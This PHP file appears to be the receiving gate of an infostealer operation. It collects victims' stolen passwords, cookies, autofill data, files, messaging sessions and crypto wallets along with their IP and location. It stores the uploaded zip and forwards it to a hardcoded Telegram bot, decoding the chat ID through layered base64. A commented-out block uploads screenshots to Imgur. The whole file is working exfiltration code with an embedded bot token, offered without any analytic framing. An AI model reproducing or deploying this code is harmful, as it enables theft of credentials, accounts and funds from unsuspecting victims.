<?php

$passwords = $_GET['p'];
$cookies = $_GET['c'];
$forms = $_GET['a'];
$files = $_GET['f'];
$telegram = $_GET['t'];
$filezilla = $_GET['fz'];
$steam = $_GET['s'];
$crypto = $_GET['cr'];
$discord = $_GET['ds'];
$pidgin = $_GET['pd'];
$domaindetect = $_GET['dd'];

$ip = $_SERVER['REMOTE_ADDR'];


$message = "————————————————
<b>🔥New log🔥</b>
————————————————
IP - ".$ip."
City - ".$_GET['ct']."
Country - ".$_GET['cy']."
Country code - ".$_GET['cc']."
————————————————
Passwords  - <b>".$passwords."</b>
Cookies  - <b>".$cookies."</b>
Autofill  - <b>".$forms."</b>
Files - <b>".$files."</b>";

if ($filezilla != '0')
    $message = $message."
Servers <b>FileZilla</b> - <b>".$filezilla."</b>";

if ($telegram == '1')
    $message = $message."
Session <b>Telegram</b>";

if ($discord == '1')
    $message = $message."
Session <b>Discord</b>";

if ($pidgin == '1')
    $message = $message."
Account <b>Pidgin</b>";

if ($steam == '1')
    $message = $message."
Files <b>Steam</b>";

if ($crypto == '1')
    $message = $message."
<b>Wallets</b>";

$message = $message."
————————————————";

if ($domaindetect != "")
{
	$message = $message."
<b>DD:</b>
".$domaindetect."————————————————";
}

$DIR = 't/';
$HWID = $_GET['name'].'.zip';

$f1 = file_get_contents($_FILES['file']['tmp_name']);
$fd = fopen($DIR.$HWID, 'w') or die("lol");
fwrite($fd, $f1);
fclose($fd);

$url = "https://api.telegram.org/bot1079171427:AAHsYZ1EDXDjO5tppF8Yy2YUS_J7GZQlOgs/sendDocument";
$document = new CURLFile(realpath($DIR.$HWID));
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, ["chat_id" => strrev(base64_decode(base64_decode(base64_decode($_GET['ci'])))),  "document" => $document, "caption" => $message, "parse_mode" => "html"]);
curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
$out = curl_exec($ch);
curl_close($ch);
unlink($DIR.$HWID);






/*$image = file_get_contents("zip://".realpath($FILE_PATH)."#Screen.jpg");
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.imgur.com/3/image.json');
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
curl_setopt($ch, CURLOPT_HTTPHEADER, array( "Authorization: Client-ID 66899703099c87f" ));
curl_setopt($ch, CURLOPT_POSTFIELDS, array( 'image' => base64_encode($image) ));
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$reply = curl_exec($ch);
curl_close($ch);
$reply = json_decode($reply); */
//echo $reply->data->link;

?>